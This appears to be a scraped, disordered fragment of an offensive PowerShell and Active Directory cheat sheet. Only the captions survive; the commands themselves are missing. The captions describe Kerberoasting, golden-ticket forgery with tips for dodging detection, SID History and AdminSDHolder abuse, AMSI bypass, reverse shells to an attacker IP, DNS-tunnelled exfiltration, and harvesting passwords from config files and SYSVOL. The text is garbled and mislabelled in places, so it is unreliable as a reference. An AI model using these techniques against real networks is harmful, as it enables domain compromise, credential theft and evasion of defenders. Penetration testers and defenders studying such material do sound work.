Here's a quick one-liner for checking whether we are running elevated PowerShell session with Administrator privileges:
List all usernames
Using the Get-WinEvent cmdlet to query the Security log for events with Event ID 4769. The command filters the events based on various conditions in the event message. Specifically, it filters out events where the service account is 'krbtgt,' the account name ends with '$', the account name does not contain '$@', the failure status is '0x0,' and the substatus is '0x17'.
perform Kerberoasting against the specified domain controller ("dc.domain.local") for the "domain.local" domain. It uses a user with no preauthentication ("NO_PREAUTH_USER") and targets a specific service principal name ("TARGET_SERVICE"), with the results saved to an output file named "kerberoastables.txt".
SID History Abuse You could also abuse SID History across a forest trust.  If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.  As a reminder, you can get the signing key with

Attack SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.  This can be achieved using either a Golden or Diamond Ticket. Find the SID of a group of the other domain (for example "Domain Admins") is with:
Extract all backup Master Keys with Domain Admin A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:
List installed antivirus (AV) products, Here's a simple PowerShell command to query Security Center and identify all installed Antivirus products on this computer:
Check for LSASS WDigest caching, Using the following command we can check whether the WDigest credential caching is enabled on the system or not. This settings dictates whether we will be able to use Mimikatz to extract plaintext credentials from the LSASS process memory.
Downloading and Executing Scripts from URL, Downloads and executes a PowerShell script from a specified URL. Useful for executing remote payloads.
Get root domain SID (this is the SID of the domain that has the trust relationship with the child domain)
Creating Reverse Shell, Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command execution.
Since the SYSVOL network shares are accessible to any authenticated domain user, we can easily identify if there are any stored credentials using the following command:
Users that require a smart card to logon
Accessing Physical Memory with Windows API, This PowerShell script uses the ReadProcessMemory function from the Windows API to read a specified amount of memory from a process. It's useful for extracting information from running processes.
Finding Windows Servers on the domain Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
Get usernames and their groups where name is like "admin"
Get Forest info
Locate web server configuration files, With this command, we can easily find configuration files belonging to Microsoft IIS, XAMPP, Apache, PHP or MySQL installation:
It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Manual trusted link queery
Enumerate machines where a particular user/group identity has local admin rights
Modifying Token Privileges, Removing Privileges completely removes a privilege from a token, preventing its re-enabling.
SpoolSample.exe with the specified <TARGET> and <RESPONDERIP> as parameters, suggesting an attempt to exploit a print spooler vulnerability for lateral movement or privilege escalation in a Windows environment.
Full way impersonating the user, Get a TGT from the current domain for the target domain for the user
Extracting Saved RDP Credentials, Lists and deletes saved Remote Desktop Protocol (RDP) credentials, which can be used to access remote systems.
Search unconstrained delegation computers and show users
Get all domain trusts (parent, children and external)
Bypassing AMSI (Anti-Malware Scan Interface), Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially malicious scripts without detection.
ackdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Users Filters, All disabled users
Get active sessions on the host
Find database credentials in configuration files, Using the following PowerShell command we can find database connection strings (with plaintext credentials) stored in various configuration files such as web.config for ASP.NET configuration, in Visual Studio project files etc.:
Search account with "something" in a parameter
DNS-Based PowerShell Reverse Shell, This script uses DNS requests to exfiltrate data, making the reverse shell traffic appear as DNS queries, which can be less suspicious and harder to detect.
Port scan a network for a single port (port-sweep) with PowerShell TcpClient, This could be useful for example for quickly discovering SSH interfaces (port tcp/22) on a specified network Class C subnet (10.10.0.0/24):
After we are done with our business, remove the rule in the Windows firewall:
Retrieving Passwords from Unsecured Files, Searches for the term `password' in all text files within the Documents folders of all users, which can reveal passwords stored insecurely.
Here's a useful command to whitelist an IP address in the Windows firewall, after this we should be able to connect to this host from our IP address (10.10.15.123) on every port:
Get all ifo of specific domain Domain Controller
Check for possible vulnerabilities on an instance where you have access
Bypassing common detections The most frequent ways to detect a golden ticket are by inspecting Kerberos traffic on the wire.  By default, Mimikatz signs the TGT for 10 years, which will stand out as anomalous in subsequent TGS requests made with it.  Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).
Meterpreter Get rev shell (x64), generate a payload with the intent of establishing a reverse TCP shell on a target system.
Bypassing Script Execution Policy, Temporarily changes the script execution policy to allow the running of unauthorized scripts, then reverts it back to its original setting.
Windows API for Clipboard Access, This script demonstrates how to access and manipulate the Windows clipboard using API calls. It can be used to read or modify clipboard contents for information gathering or data manipulation.
Reverse shell: uninstall a .NET assembly (psby.exe) using InstallUtil.exe while simultaneously attempting to establish a reverse shell connection to the IP address 10.10.13.206 on port 443, with logging to the console enabled.
Search for SNMP community string in registry, Finding a SNMP community string is not a critical issue, but it could be useful to Understand what kind of password patterns are used among sysadmins in the organization, The following command will extract SNMP community string stored in the registry, if there is any:
Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)
Manipulating Windows Services via API, This script uses Windows API calls to interact with Windows services, such as creating, starting, or modifying them. This can be used for persistence or privilege escalation.
Get info about a user
 Mimikatz tool to perform a Kerberos Golden Ticket attack.Generate a forged Kerberos ticket for the Administrator user in the specified domain ("rd.lab.adsecurity.org"). It specifies various parameters such as the user ID, security identifier (SID), key, group information, and ticket lifetime. After executing the Mimikatz command, it exits, potentially to avoid leaving traces or to conclude the operation.
Conducting Network Sniffing, Sets up a network capture session to sniff packets, which can be analyzed for sensitive data or network troubleshooting.
Get locally logon users at the moment (need remote registry (default in server OS))
Retrieving Credentials from Database Connection Strings, Scans for database connection strings in web application configuration files, which often contain credentials for database access.
Basic user enabled info
To stop a guest SMB shared drive, (This could come handy for transferring files, exfiltration etc.) execute:
Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
